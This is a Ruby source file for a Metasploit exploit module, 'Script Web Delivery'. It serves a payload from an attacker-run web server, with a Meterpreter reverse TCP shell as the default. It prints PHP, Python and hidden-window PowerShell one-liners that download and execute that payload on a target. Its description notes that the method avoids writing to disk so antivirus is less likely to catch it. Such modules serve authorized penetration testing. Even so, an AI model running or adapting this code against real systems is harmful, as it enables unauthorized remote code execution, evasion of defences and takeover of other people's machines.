##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/exploit/powershell'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ManualRanking

  include Msf::Exploit::Powershell
  include Msf::Exploit::Remote::HttpServer

  def initialize(info = {})
    super(update_info(info,
      'Name'         => 'Script Web Delivery',
      'Description'  => %q(
        This module quickly fires up a web server that serves a payload.
        The provided command will start the specified scripting language interpreter and then download and execute the
        payload. The main purpose of this module is to quickly establish a session on a target
        machine when the attacker has to manually type in the command himself, e.g. Command Injection,
        RDP Session, Local Access or maybe Remote Command Exec. This attack vector does not
        write to disk so it is less likely to trigger AV solutions and will allow privilege
        escalations supplied by Meterpreter. When using either of the PSH targets, ensure the
        payload architecture matches the target computer or use SYSWOW64 powershell.exe to execute
        x86 payloads on x64 machines.
      ),
      'License'      => MSF_LICENSE,
      'Author'       =>
        [
          'Andrew Smith "jakx" <jakx.ppr@gmail.com>',
          'Ben Campbell',
          'Chris Campbell' # @obscuresec - Inspiration n.b. no relation!
        ],
      'DefaultOptions' =>
        {
          'Payload'    => 'python/meterpreter/reverse_tcp'
        },
      'References'     =>
        [
          ['URL', 'http://securitypadawan.blogspot.com/2014/02/php-meterpreter-web-delivery.html'],
          ['URL', 'http://www.pentestgeek.com/2013/07/19/invoke-shellcode/'],
          ['URL', 'http://www.powershellmagazine.com/2013/04/19/pstip-powershell-command-line-switches-shortcuts/'],
          ['URL', 'http://www.darkoperator.com/blog/2013/3/21/powershell-basics-execution-policy-and-code-signing-part-2.html']
        ],
      'Platform'       => %w(python php win),
      'Targets'        =>
        [
          ['Python', {
            'Platform' => 'python',
            'Arch' => ARCH_PYTHON
          }],
          ['PHP', {
            'Platform' => 'php',
            'Arch' => ARCH_PHP
          }],
          ['PSH', {
            'Platform' => 'win',
            'Arch' => [ARCH_X86, ARCH_X86_64]
          }]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Jul 19 2013'
    ))
  end

  def on_request_uri(cli, _request)
    print_status('Delivering Payload')
    if target.name.include? 'PSH'
      data = cmd_psh_payload(payload.encoded,
                             payload_instance.arch.first,
                             remove_comspec: true,
                             exec_in_place: true
                           )
    else
      data = %Q(#{payload.encoded} )
    end
    send_response(cli, data,  'Content-Type' => 'application/octet-stream')
  end

  def primer
    url = get_uri
    print_status('Run the following command on the target machine:')
    case target.name
    when 'PHP'
      print_line("php -d allow_url_fopen=true -r \"eval(file_get_contents('#{url}'));\"")
    when 'Python'
      print_line("python -c \"import urllib2; r = urllib2.urlopen('#{url}'); exec(r.read());\"")
    when 'PSH'
      ignore_cert = Rex::Powershell::PshMethods.ignore_ssl_certificate if ssl
      download_string = Rex::Powershell::PshMethods.proxy_aware_download_and_exec_string(url)
      download_and_run = "#{ignore_cert}#{download_string}"
      print_line generate_psh_command_line(
                                             noprofile: true,
                                             windowstyle: 'hidden',
                                             command: download_and_run
                                           )
    end
  end
end
